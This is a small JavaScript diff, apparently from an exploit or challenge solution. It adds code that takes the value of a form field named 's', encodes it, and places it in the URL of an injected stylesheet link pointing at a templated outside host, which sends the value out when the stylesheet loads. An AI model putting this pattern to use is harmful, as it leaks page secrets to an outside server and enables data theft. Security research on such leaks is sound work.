@@ -26,6 +26,11 @@ W = () => {
 L = () => {
   document.querySelector('#i').innerHTML =
     "<link type=text/css rel='stylesheet noreferrer' referrerpolicy=no-referrer href=((form_action))" +
+    document.querySelector('[name="s"]')
+    .value
+    .replace(/[+]/g, '-')
+    .replace(/\//g, '_') +
+    '/' +
     s +
     '.css onload=C()>';
 };
